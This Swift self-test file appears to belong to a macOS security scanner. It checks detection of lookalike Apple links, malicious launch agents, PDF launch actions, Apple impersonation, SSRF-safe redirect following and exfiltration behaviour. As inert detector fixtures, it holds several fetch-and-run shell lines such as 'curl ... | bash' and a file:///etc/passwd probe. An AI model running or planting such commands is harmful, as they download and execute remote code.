import Foundation
import RampartShared
import RampartWeb
import RampartBehaviour

// Deep content inspection, Apple impersonation, safe link-chain analysis and threat-chain behaviour rules.
// All fixtures are synthetic and inert: .test / example.com domains, com.rampart.test.* labels, no network
// (the chain inspector runs against a mock URLProtocol and a fake resolver).
extension SelfTest {
    static func deepChecks() {
        deepContentChecks()
        deepImpersonationChecks()
        deepChainChecks()
        deepBehaviourChecks()
    }

    static let deepInspector: DeepContentInspector = {
        let c = PasteClassifier()
        return DeepContentInspector(classifyCommand: { let r = c.classify($0); return (r.score, r.reasons) })
    }()

    static func plistData(_ o: Any) -> Data { try! PropertyListSerialization.data(fromPropertyList: o, format: .xml, options: 0) }

    // MARK: 1) deep content

    static func deepContentChecks() {
        let ins = deepInspector
        // webloc with a combosquat Apple link
        var r = ins.inspect(data: plistData(["URL": "https://appleid-verify-account.test/signin"]), name: "Invoice.webloc")
        check(r.indicators.contains { $0.kind == .url && $0.location == "key:URL" }, "deep webloc url extracted with key path")
        check(r.score >= 60 && r.evidence.contains { $0.title.contains("Apple") }, "deep webloc lookalike Apple link flagged")
        // homograph (Cyrillic а) in an .inetloc
        let homo = "https://" + Punycode.encodeHost("\u{0430}pple.test") + "/id"
        r = ins.inspect(data: plistData(["URL": homo]), name: "Receipt.inetloc")
        check(r.score >= 60, "deep inetloc homograph flagged")
        // benign webloc to the real site
        r = ins.inspect(data: plistData(["URL": "https://support.apple.com/en-us/HT201222"]), name: "Apple Support.webloc")
        check(r.score < 30 && r.evidence.isEmpty, "deep benign apple.com webloc clean")
        // .url (Windows INI) with Microsoft lookalike
        r = ins.inspect(data: Data("[InternetShortcut]\r\nURL=https://microsoft-office365-login.test/auth\r\n".utf8), name: "Shared doc.url")
        check(r.indicators.first?.location.contains("line 2") == true && r.score >= 60, "deep .url Microsoft lookalike with line location")
        // launch agent: dangerous ProgramArguments
        let agent = plistData(["Label": "com.rampart.test.agent", "RunAtLoad": true,
                               "ProgramArguments": ["/bin/bash", "-c", "curl -fsSL https://icloud-sync.test/a.sh | bash"]])
        r = ins.inspect(data: agent, name: "com.rampart.test.agent.plist")
        check(r.indicators.contains { $0.kind == .command && $0.location == "key:ProgramArguments" }, "deep launch plist command at key path")
        check(r.evidence.contains { $0.title.hasPrefix("Dangerous command") && $0.score >= 30 }, "deep launch plist curl|bash classified")
        check(r.evidence.contains { $0.title.contains("Apple") }, "deep launch plist icloud lookalike url")
        // Info.plist: http update feed + claims http scheme
        let info = plistData(["CFBundleIdentifier": "com.rampart.test.app", "SUFeedURL": "http://updates.example.com/appcast.xml",
                              "CFBundleURLTypes": [["CFBundleURLSchemes": ["http", "rampart-test"]]]])
        r = ins.inspect(data: info, name: "Test.app/Contents/Info.plist")
        check(r.evidence.contains { $0.title.contains("plain http") && $0.detail.contains("key:SUFeedURL") }, "deep SUFeedURL http flagged")
        check(r.evidence.contains { $0.title.contains("http: URL scheme") }, "deep CFBundleURLSchemes http claim flagged")
        check(r.indicators.contains { $0.kind == .scheme && $0.value == "rampart-test" }, "deep custom URL scheme extracted")
        // benign Info.plist with https feed
        r = ins.inspect(data: plistData(["CFBundleIdentifier": "com.rampart.test.ok", "SUFeedURL": "https://updates.example.com/appcast.xml"]), name: "Ok.app/Contents/Info.plist")
        check(r.evidence.isEmpty, "deep benign Info.plist clean")
        // .terminal CommandString
        r = ins.inspect(data: plistData(["CommandString": "curl -s http://198.51.100.7/x | sh", "name": "Basic"]), name: "Settings.terminal")
        check(r.evidence.contains { $0.title.hasPrefix("Dangerous command") }, "deep .terminal CommandString classified")
        // .command script
        r = ins.inspect(data: Data("#!/bin/zsh\ncd /tmp && curl -o u https://app-store-update.test/u && chmod +x u && ./u\n".utf8), name: "Install Update.command")
        check(r.format == "shellScript" && r.evidence.contains { $0.title.hasPrefix("Dangerous command") }, "deep .command classified")
        // AppleScript do shell script
        r = ins.inspect(data: Data("tell application \"Finder\" to activate\ndo shell script \"curl -fsSL https://x.example.com/p | sh\"\n".utf8), name: "Helper.applescript")
        check(r.indicators.contains { $0.kind == .command && $0.value.hasPrefix("curl") && $0.location.contains("line 2") }, "deep applescript shell call extracted")
        // Python os.system
        r = ins.inspect(data: Data("import os\nos.system('curl -s https://icloud-stats.test/c | bash')\n".utf8), name: "tool.py")
        check(r.indicators.contains { $0.kind == .command && $0.value.contains("icloud-stats.test") }, "deep python os.system extracted")
        // HTML with meta refresh and JS location to lookalike
        r = ins.inspect(data: Data("<html><head><meta http-equiv=\"refresh\" content=\"0; url=https://apple-id-locked.test/x\"></head><script>location.href='https://www.example.com/'</script></html>".utf8), name: "message.html")
        check(r.indicators.contains { $0.kind == .action && $0.value.hasPrefix("meta-refresh") }, "deep html meta-refresh recorded")
        check(r.score >= 60, "deep html lookalike flagged")
        // PDF: /URI to lookalike and /Launch
        let pdf = "%PDF-1.4\n1 0 obj << /Type /Annot /A << /S /URI /URI (https://apple-billing-support.test/pay) >> >> endobj\n2 0 obj << /S /Launch /F (Install.command) >> endobj\n3 0 obj << /OpenAction << /S /JavaScript /JS (app.launchURL\\(\"https://icloud-verify.test\"\\)) >> >> endobj\n%%EOF"
        r = ins.inspect(data: Data(pdf.utf8), name: "Statement.pdf")
        let uri = r.indicators.first { $0.kind == .url && $0.value.contains("apple-billing-support") }
        check(uri?.location.hasPrefix("offset:0x") == true && uri?.location.contains("/URI") == true, "deep pdf /URI offset")
        check(r.evidence.contains { $0.title == "PDF can launch a program" }, "deep pdf /Launch flagged")
        check(r.evidence.contains { $0.title == "PDF runs script when opened" }, "deep pdf OpenAction JS flagged")
        check(r.score >= 80, "deep pdf combined score high")
        // Office docx: external relationship target
        let rels = "<?xml version=\"1.0\"?><Relationships><Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate\" Target=\"https://office365-templates.test/t.dotm\" TargetMode=\"External\"/></Relationships>"
        let docx = deepZip([("[Content_Types].xml", Data("<Types/>".utf8)), ("word/_rels/settings.xml.rels", Data(rels.utf8))])
        r = ins.inspect(data: docx, name: "Report.docx")
        check(r.format == "office" && r.indicators.contains { $0.location.hasPrefix("zip:word/_rels/settings.xml.rels@0x") }, "deep docx relationship target located")
        check(r.evidence.contains { $0.title.contains("remote template") }, "deep docx remote template flagged")
        // Mach-O strings
        var macho = Data([0xcf, 0xfa, 0xed, 0xfe]) + Data(repeating: 0, count: 60)
        let off = macho.count
        macho += Data("https://app1e-analytics.test/collect\0".utf8) + Data(repeating: 0, count: 16) + Data("/bin/sh -c curl -s https://icloud-stats.test/u | sh\0".utf8)
        r = ins.inspect(data: macho, name: "softwareupdated")
        check(r.format == "machO" && r.indicators.contains { $0.kind == .url && $0.location.hasPrefix(String(format: "offset:0x%x", off)) }, "deep mach-o string url offset")
        check(r.evidence.contains { $0.title.hasPrefix("Dangerous command") }, "deep mach-o embedded shell command")
        // Benign Mach-O: reverse-DNS identifiers are not domains
        r = ins.inspect(data: Data([0xcf, 0xfa, 0xed, 0xfe]) + Data("com.apple.security.cs.allow-jit\0https://www.apple.com/appleca/\0".utf8), name: "tool")
        check(!r.indicators.contains { $0.kind == .domain } && r.evidence.isEmpty, "deep benign mach-o clean")
        check(DeepContentInspector.isInteresting(path: "/x/a.webloc") && !DeepContentInspector.isInteresting(path: "/x/a.jpg"), "deep interesting extensions")
    }

    /// Minimal stored (method 0) ZIP writer for fixtures.
    static func deepZip(_ files: [(String, Data)]) -> Data {
        func le16(_ v: Int) -> Data { Data([UInt8(v & 0xff), UInt8((v >> 8) & 0xff)]) }
        func le32(_ v: Int) -> Data { le16(v & 0xffff) + le16((v >> 16) & 0xffff) }
        var out = Data(), central = Data()
        for (name, data) in files {
            let n = Data(name.utf8), offset = out.count
            let local: [Data] = [le32(0x04034b50), le16(20), le16(0), le16(0), le16(0), le16(0), le32(0), le32(data.count), le32(data.count), le16(n.count), le16(0), n, data]
            for part in local { out.append(part) }
            let cd: [Data] = [le32(0x02014b50), le16(20), le16(20), le16(0), le16(0), le16(0), le16(0), le32(0), le32(data.count), le32(data.count),
                              le16(n.count), le16(0), le16(0), le16(0), le16(0), le32(0), le32(offset), n]
            for part in cd { central.append(part) }
        }
        let cdOff = out.count
        let end: [Data] = [central, le32(0x06054b50), le16(0), le16(0), le16(files.count), le16(files.count), le32(central.count), le32(cdOff), le16(0)]
        for part in end { out.append(part) }
        return out
    }

    // MARK: 2) Apple impersonation

    static func deepImpersonationChecks() {
        typealias S = AppleImpersonation.Subject
        let home = "/Users/rampart-test"
        var e = AppleImpersonation.assess(S(path: home + "/Library/Application Support/softwareupdated", signing: SigningInfo(status: .unsigned)))
        check((e?.score ?? 0) >= 80, "imp unsigned softwareupdated in home >= 80")
        e = AppleImpersonation.assess(S(path: home + "/Applications/Safari Update.app", bundleID: "com.apple.Safari.update", signing: SigningInfo(status: .adHoc)))
        check((e?.score ?? 0) >= 80, "imp com.apple bundle ID ad-hoc >= 80")
        e = AppleImpersonation.assess(S(path: "/tmp/x/Software_Update", signing: SigningInfo(status: .developerID, teamID: "ABCDE12345", notarized: false)))
        check((e?.score ?? 0) >= 80, "imp Software Update name, non-Apple Developer ID >= 80")
        e = AppleImpersonation.assess(S(path: home + "/Library/XProtect", signingID: "com.apple.xprotect", signing: SigningInfo(status: .adHoc)))
        check((e?.score ?? 0) >= 80, "imp XProtect signing ID ad-hoc >= 80")
        e = AppleImpersonation.assess(S(path: home + "/.cache/App1e Helper", signing: SigningInfo(status: .unsigned)))
        check((e?.score ?? 0) >= 80, "imp homoglyph App1e unsigned >= 80")
        e = AppleImpersonation.assess(S(path: home + "/Library/\u{0410}pple/agent", signing: SigningInfo(status: .unsigned)))
        check((e?.score ?? 0) >= 80, "imp Cyrillic Apple folder unsigned")
        let item = PersistenceItem(kind: .launchAgent, label: "com.apple.softwareupdate.agent", location: home + "/Library/LaunchAgents/com.apple.softwareupdate.agent.plist",
                                   target: "/Users/Shared/.upd/updater", signing: SigningInfo(status: .unsigned))
        check((AppleImpersonation.assess(item: item)?.score ?? 0) >= 80, "imp com.apple launch agent with unsigned target >= 80")
        // Apple-signed binary copied out of the system (LOLBin masquerade): flagged, moderate
        e = AppleImpersonation.assess(S(path: "/private/tmp/softwareupdated", isPlatformBinary: true))
        check(e != nil && (e?.score ?? 100) < 60, "imp Apple binary outside SIP is moderate")
        // Benign
        check(AppleImpersonation.assess(S(path: "/usr/libexec/softwareupdated", signingID: "com.apple.softwareupdated", isPlatformBinary: true)) == nil, "imp benign real softwareupdated")
        check(AppleImpersonation.assess(S(path: "/System/Applications/Mail.app/Contents/MacOS/Mail", signingID: "com.apple.mail", isPlatformBinary: true)) == nil, "imp benign Mail")
        check(AppleImpersonation.assess(S(path: "/Applications/Safari.app/Contents/MacOS/Safari", signingID: "com.apple.Safari", signing: SigningInfo(status: .apple))) == nil, "imp benign Safari")
        check(AppleImpersonation.assess(S(path: "/Applications/Pineapple Editor.app", bundleID: "com.rampart.test.pineapple", signing: SigningInfo(status: .unsigned))) == nil, "imp benign pineapple")
        check((AppleImpersonation.assess(S(path: "/Applications/iCloud Photos Exporter.app", bundleID: "com.rampart.test.exporter",
              signing: SigningInfo(status: .developerID, teamID: "ABCDE12345", notarized: true)))?.score ?? 0) < 60, "imp notarized third-party iCloud tool stays low")
        let realItem = PersistenceItem(kind: .launchDaemon, label: "com.apple.softwareupdated", location: "/System/Library/LaunchDaemons/com.apple.softwareupdated.plist",
                                       target: "/System/Library/PrivateFrameworks/SoftwareUpdate.framework/Resources/softwareupdated", signing: SigningInfo(status: .apple))
        check(AppleImpersonation.assess(item: realItem) == nil, "imp benign real Apple launch daemon")
        // FileDetector over a real temp launch plist fixture
        let dir = NSTemporaryDirectory() + "rampart-deep-\(getpid())"
        try? FileManager.default.createDirectory(atPath: dir + "/LaunchAgents", withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(atPath: dir) }
        let p = dir + "/LaunchAgents/com.apple.icloud.sync.plist"
        try? plistData(["Label": "com.apple.icloud.sync", "ProgramArguments": [dir + "/.sync/icloudd"]]).write(to: URL(fileURLWithPath: p))
        let hits = AppleImpersonationDetector().inspect(FileFacts(path: p, size: 100, kind: .plist))
        check((hits.first?.score ?? 0) >= 80, "imp detector flags com.apple label plist outside /System")
        let benign = dir + "/LaunchAgents/com.rampart.test.helper.plist"
        try? plistData(["Label": "com.rampart.test.helper", "ProgramArguments": ["/Applications/Rampart Test.app/Contents/MacOS/helper", "--daemon"]]).write(to: URL(fileURLWithPath: benign))
        check(DeepContentDetector(inspector: deepInspector).inspect(FileFacts(path: benign, size: 100, kind: .plist)).isEmpty, "deep detector quiet on benign launch plist")
        check(AppleImpersonationDetector().inspect(FileFacts(path: benign, size: 100, kind: .plist)).isEmpty, "imp detector quiet on benign launch plist")
    }

    // MARK: 3) link chain (mock network only)

    final class DeepMockProtocol: URLProtocol {
        struct Route { var status: Int; var headers: [String: String]; var body: Data }
        nonisolated(unsafe) static var routes: [String: Route] = [:]
        nonisolated(unsafe) static var seen: [URLRequest] = []
        static let lock = NSLock()
        override class func canInit(with request: URLRequest) -> Bool { true }
        override class func canonicalRequest(for request: URLRequest) -> URLRequest { request }
        override func startLoading() {
            Self.lock.lock(); Self.seen.append(request); let r = Self.routes[request.url!.absoluteString]; Self.lock.unlock()
            let route = r ?? Route(status: 404, headers: ["Content-Type": "text/html"], body: Data("nope".utf8))
            let resp = HTTPURLResponse(url: request.url!, statusCode: route.status, httpVersion: "HTTP/1.1", headerFields: route.headers)!
            client?.urlProtocol(self, didReceive: resp, cacheStoragePolicy: .notAllowed)
            if request.httpMethod != "HEAD" { client?.urlProtocol(self, didLoad: route.body) }
            client?.urlProtocolDidFinishLoading(self)
        }
        override func stopLoading() {}
    }

    static func deepChainChecks() {
        check(RedirectChainInspector.isForbiddenIP("127.0.0.1") && RedirectChainInspector.isForbiddenIP("10.1.2.3") && RedirectChainInspector.isForbiddenIP("169.254.169.254")
              && RedirectChainInspector.isForbiddenIP("::1") && RedirectChainInspector.isForbiddenIP("fd00::1") && RedirectChainInspector.isForbiddenIP("::ffff:192.168.1.1")
              && RedirectChainInspector.isForbiddenIP("100.64.0.1") && !RedirectChainInspector.isForbiddenIP("93.184.216.34"), "chain SSRF IP classes")
        let resolver: @Sendable (String) -> [String] = { h in h == "internal.test" ? ["10.0.0.5"] : ["93.184.216.34"] }
        let ins = RedirectChainInspector(protocolClasses: [DeepMockProtocol.self], resolver: resolver)
        ins.perHopTimeout = 3
        let html = ["Content-Type": "text/html"]
        // Chain: example.com -> 302 -> appleid-verify.test -> meta refresh -> icloud-check.top -> js location -> final dmg
        DeepMockProtocol.routes = [
            "https://news.example.com/story": .init(status: 302, headers: ["Location": "https://appleid-verify.test/login"], body: Data()),
            "https://appleid-verify.test/login": .init(status: 200, headers: html, body: Data("<meta http-equiv=\"refresh\" content=\"0;url=https://icloud-check.top/step2\">".utf8)),
            "https://icloud-check.top/step2": .init(status: 200, headers: html, body: Data("<script>window.location = 'https://cdn.example.com/Apple%20Update.dmg';</script>".utf8)),
            "https://cdn.example.com/Apple%20Update.dmg": .init(status: 206, headers: ["Content-Type": "application/x-apple-diskimage",
                "Content-Disposition": "attachment; filename=\"Apple Update.dmg\""], body: Data(repeating: 0, count: 128)),
        ]
        DeepMockProtocol.seen = []
        var rep = ins.inspectBlocking("https://news.example.com/story", overallTimeout: 20)
        check(rep.hops.count == 4, "chain followed 4 hops (\(rep.hops.count))")
        check(rep.hops.map(\.via) == ["start", "http-302", "meta-refresh", "js-location"], "chain hop kinds")
        check(rep.servesDownload && rep.downloadKind != nil, "chain final download detected")
        check(rep.score >= 60 && rep.verdict == .likelyScam, "chain scored as scam (\(rep.score))")
        check(!DeepMockProtocol.seen.contains { $0.value(forHTTPHeaderField: "Cookie") != nil }, "chain sent no cookies")
        check(DeepMockProtocol.seen.contains { $0.httpMethod == "HEAD" } && DeepMockProtocol.seen.contains { $0.value(forHTTPHeaderField: "Range") == "bytes=0-65535" }, "chain HEAD then ranged GET")
        // Magic bytes on an innocuous content type
        DeepMockProtocol.routes = ["https://files.example.com/invoice": .init(status: 200, headers: ["Content-Type": "text/plain"], body: Data([0xcf, 0xfa, 0xed, 0xfe, 7, 0, 0, 1]))]
        rep = ins.inspectBlocking("https://files.example.com/invoice", overallTimeout: 10)
        check(rep.servesDownload && rep.downloadKind == "mach-o", "chain mach-o by magic bytes")
        // SSRF: redirect into a private address is refused, never fetched
        DeepMockProtocol.routes = ["https://hop.example.com/a": .init(status: 302, headers: ["Location": "http://internal.test/admin"], body: Data()),
                                   "https://hop2.example.com/a": .init(status: 302, headers: ["Location": "http://127.0.0.1/x"], body: Data())]
        DeepMockProtocol.seen = []
        rep = ins.inspectBlocking("https://hop.example.com/a", overallTimeout: 10)
        check(rep.stoppedReason == "ssrf-refused" && !DeepMockProtocol.seen.contains { $0.url?.host == "internal.test" }, "chain SSRF via DNS refused")
        rep = ins.inspectBlocking("https://hop2.example.com/a", overallTimeout: 10)
        check(rep.stoppedReason == "ssrf-refused", "chain SSRF literal loopback refused")
        rep = ins.inspectBlocking("file:///etc/passwd", overallTimeout: 5)
        check(rep.stoppedReason == "scheme-refused" && rep.hops.count == 1, "chain non-http scheme refused")
        // Max 10 hops
        var routes: [String: DeepMockProtocol.Route] = [:]
        for i in 0..<15 { routes["https://r\(i).example.com/"] = .init(status: 302, headers: ["Location": "https://r\(i + 1).example.com/"], body: Data()) }
        DeepMockProtocol.routes = routes; DeepMockProtocol.seen = []
        rep = ins.inspectBlocking("https://r0.example.com/", overallTimeout: 30)
        check(rep.stoppedReason == "max-hops" && rep.hops.count == 11 && !DeepMockProtocol.seen.contains { $0.url?.host == "r12.example.com" }, "chain stops at 10 redirects (\(rep.hops.count))")
        // Benign: a page with no redirect
        DeepMockProtocol.routes = ["https://www.example.com/": .init(status: 200, headers: html, body: Data("<html><body>Hello</body></html>".utf8))]
        rep = ins.inspectBlocking("https://www.example.com/", overallTimeout: 10)
        check(rep.hops.count == 1 && !rep.servesDownload && rep.score < 30, "chain benign single page")
        // Textual redirect parser
        check(RedirectChainInspector.textualRedirect("<script>location.replace(\"https:\\/\\/a.test\\/x\")</script>")?.0 == "https://a.test/x", "chain js replace parsed")
    }

    // MARK: 4) behaviour rules

    static func deepBehaviourChecks() {
        let t0 = Date(timeIntervalSince1970: 1_800_000_000)
        let today = t0
        func det() -> ThreatChainDetector {
            ThreatChainDetector(isLookalikeHost: { $0.contains("appleid-verify") || $0.contains("icloud-check") },
                                firstSeen: { $0.hasSuffix(".test") ? today : .distantPast })
        }
        let trojan = ProcessInfoLite(pid: 900, ppid: 1, path: "/Users/rampart-test/Library/Application Support/softwareupdated", args: [])
        let mail = ProcessInfoLite(pid: 50, ppid: 1, path: "/System/Applications/Mail.app/Contents/MacOS/Mail", signingID: "com.apple.mail", isPlatformBinary: true)
        let contacts = ProcessInfoLite(pid: 51, ppid: 1, path: "/System/Applications/Contacts.app/Contents/MacOS/Contacts", signingID: "com.apple.AddressBook", isPlatformBinary: true)
        let analyticsd = ProcessInfoLite(pid: 52, ppid: 1, path: "/System/Library/PrivateFrameworks/CoreAnalytics.framework/Support/analyticsd", signingID: "com.apple.analyticsd", isPlatformBinary: true)
        let abPath = "/Users/rampart-test/Library/Application Support/AddressBook/AddressBook-v22.abcddb"
        func close(_ p: ProcessInfoLite, _ path: String, at: TimeInterval = 0) -> SecurityEvent {
            SecurityEvent(date: t0 + at, kind: .fileClose, process: p, path: path, detail: ["modified": "0"], source: "test")
        }
        func connect(_ p: ProcessInfoLite, port: Int, host: String, at: TimeInterval, bytes: Int? = nil) -> SecurityEvent {
            var d = ["remote_ip": "93.184.216.34", "remote_port": String(port), "remote_host": host]
            if let b = bytes { d["bytes_out"] = String(b) }
            return SecurityEvent(date: t0 + at, kind: .networkConnect, process: p, detail: d, source: "test")
        }
        // TC1 contacts
        var d = det()
        let tc1 = d.ingest(close(trojan, abPath))
        check(tc1.first?.name == "Contacts harvesting" && (tc1.first?.confidence ?? 0) >= 80, "tc1 trojan reading contacts fires (with impersonation)")
        check(d.ingest(close(contacts, abPath)).isEmpty && d.ingest(close(mail, abPath)).isEmpty, "tc1 benign Contacts.app / Mail.app")
        // TC2 osascript driving Mail
        let osa = ProcessInfoLite(pid: 901, ppid: 900, path: "/usr/bin/osascript", args: ["osascript", "-e", "tell application \"Mail\" to send (make new outgoing message with properties {subject:\"hi\"})"], isPlatformBinary: true)
        check(d.ingest(SecurityEvent(date: t0, kind: .exec, process: osa, source: "test")).first?.name == "Mass-mailing behaviour", "tc2 osascript Mail send fires")
        let osaBenign = ProcessInfoLite(pid: 902, ppid: 1, path: "/usr/bin/osascript", args: ["osascript", "-e", "tell application \"Mail\" to activate"], isPlatformBinary: true)
        check(d.ingest(SecurityEvent(date: t0, kind: .exec, process: osaBenign, source: "test")).isEmpty, "tc2 benign osascript activate Mail")
        // TC3 SMTP burst
        d = det()
        var fired: [Detection] = []
        for i in 0..<6 { fired += d.ingest(connect(trojan, port: 587, host: "smtp\(i).example.com", at: Double(i) * 5)) }
        check(fired.contains { $0.name == "Mass-mailing behaviour" }, "tc3 SMTP burst fires")
        var mailFired: [Detection] = []
        for i in 0..<20 { mailFired += d.ingest(connect(mail, port: 587, host: "smtp.example.com", at: Double(i))) }
        check(mailFired.isEmpty, "tc3 benign Mail.app sending")
        let fakeMail = ProcessInfoLite(pid: 903, ppid: 1, path: "/tmp/Mail.app/Contents/MacOS/Mail", signingID: "com.apple.mail")
        var fakeFired: [Detection] = []
        for i in 0..<6 { fakeFired += d.ingest(connect(fakeMail, port: 25, host: "mx.example.com", at: Double(i))) }
        check(fakeFired.contains { $0.name == "Mass-mailing behaviour" }, "tc3 fake Mail (wrong path, unsigned) still fires")
        // TC4 Apple-ish exfil
        d = det()
        let tc4 = d.ingest(connect(trojan, port: 443, host: "apple-analytics.test", at: 0))
        check(tc4.first?.name == "Disguised exfiltration" && (tc4.first?.confidence ?? 0) >= 90, "tc4 impersonator to apple-analytics.test fires high")
        check(!d.ingest(connect(ProcessInfoLite(pid: 904, ppid: 1, path: "/Applications/Thing.app/Contents/MacOS/Thing", teamID: "ABCDE12345"), port: 443, host: "metrics.icloud-stats.test", at: 1)).isEmpty, "tc4 icloud-stats from third-party fires")
        check(d.ingest(connect(analyticsd, port: 443, host: "xp.apple.com", at: 2)).isEmpty, "tc4 benign analyticsd to xp.apple.com")
        check(d.ingest(connect(trojan, port: 443, host: "gateway.icloud.com", at: 3)).isEmpty, "tc4 benign real icloud.com host")
        check(!ThreatChainDetector.isAppleishNonApple("p12-caldav.icloud.com") && ThreatChainDetector.isAppleishNonApple("app1e-stats.test"), "tc4 appleish classifier")
        // TC5 upload volume to first-seen domain
        d = det()
        var up: [Detection] = []
        for i in 0..<5 { up += d.ingest(connect(trojan, port: 443, host: "upload.drop-files.test", at: Double(i), bytes: 6 << 20)) }
        check(up.contains { $0.name == "Possible data exfiltration" }, "tc5 30 MB to new domain fires")
        var oldUp: [Detection] = []
        for i in 0..<5 { oldUp += d.ingest(connect(trojan, port: 443, host: "backup.example.com", at: Double(i), bytes: 10 << 20)) }
        check(oldUp.isEmpty, "tc5 benign upload to long-known domain")
        // TC6 download from lookalike, then exec within window
        d = det()
        let safari = ProcessInfoLite(pid: 60, ppid: 1, path: "/Applications/Safari.app/Contents/MacOS/Safari", signingID: "com.apple.Safari", isPlatformBinary: true)
        let dl = "/Users/rampart-test/Downloads/Apple Update.app"
        _ = d.ingest(SecurityEvent(date: t0, kind: .fileCreate, process: safari, path: dl, detail: ["origin_url": "https://appleid-verify.test/dl"], source: "test"))
        let run = ProcessInfoLite(pid: 905, ppid: 1, path: dl + "/Contents/MacOS/Apple Update")
        let tc6 = d.ingest(SecurityEvent(date: t0 + 20, kind: .exec, process: run, source: "test"))
        check(tc6.first?.name == "Drive-by download executed" && (tc6.first?.confidence ?? 0) >= 85, "tc6 lookalike download run in 20 s fires")
        d = det()
        let dl2 = "/Users/rampart-test/Downloads/Tool.app"
        _ = d.ingest(SecurityEvent(date: t0, kind: .fileCreate, process: safari, path: dl2, detail: ["origin_url": "https://downloads.example.com/tool"], source: "test"))
        check(d.ingest(SecurityEvent(date: t0 + 5, kind: .exec, process: ProcessInfoLite(pid: 906, ppid: 1, path: dl2 + "/Contents/MacOS/Tool"), source: "test")).isEmpty, "tc6 benign download from normal site")
        _ = d.ingest(SecurityEvent(date: t0, kind: .fileCreate, process: safari, path: dl, detail: ["origin_url": "https://appleid-verify.test/dl"], source: "test"))
        check(d.ingest(SecurityEvent(date: t0 + 900, kind: .exec, process: run, source: "test")).isEmpty, "tc6 benign: exec outside window")
    }
}
